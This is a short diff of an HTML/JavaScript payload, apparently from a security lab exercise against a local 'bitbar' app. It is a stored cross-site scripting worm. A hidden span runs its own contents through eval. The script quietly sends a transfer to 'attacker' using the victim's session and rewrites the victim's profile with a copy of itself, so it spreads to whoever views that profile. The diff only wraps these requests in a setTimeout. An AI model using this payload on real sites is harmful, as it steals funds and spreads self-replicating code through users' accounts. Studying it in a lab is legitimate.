@@ -2,16 +2,18 @@
 <span id="bitbar_count" class="eval(document['getElementById']('hax')['innerHTML'])"></span>
 <span id="hax">
 document.getElementById('hax').style.display = "none";
-var request = new XMLHttpRequest();
-request.open("POST", "http://localhost:3000/post_transfer", true);
-request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-request.withCredentials = true;
-request.send("quantity=1&destination_username=attacker");
-request = new XMLHttpRequest();
-request.open("POST", "http://localhost:3000/set_profile", true);
-request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-request.withCredentials = true;
-request.send("new_profile=".concat(escape(document.getElementById('hax-wrap').outerHTML)));
+setTimeout(function(){
+  var request = new XMLHttpRequest();
+  request.open("POST", "http://localhost:3000/post_transfer", true);
+  request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+  request.withCredentials = true;
+  request.send("quantity=1&destination_username=attacker");
+  request = new XMLHttpRequest();
+  request.open("POST", "http://localhost:3000/set_profile", true);
+  request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+  request.withCredentials = true;
+  request.send("new_profile=".concat(escape(document.getElementById('hax-wrap').outerHTML)));
+}, 0);
 10;
 </span>
 <p>Snarky message fnar fnar fnar</p>
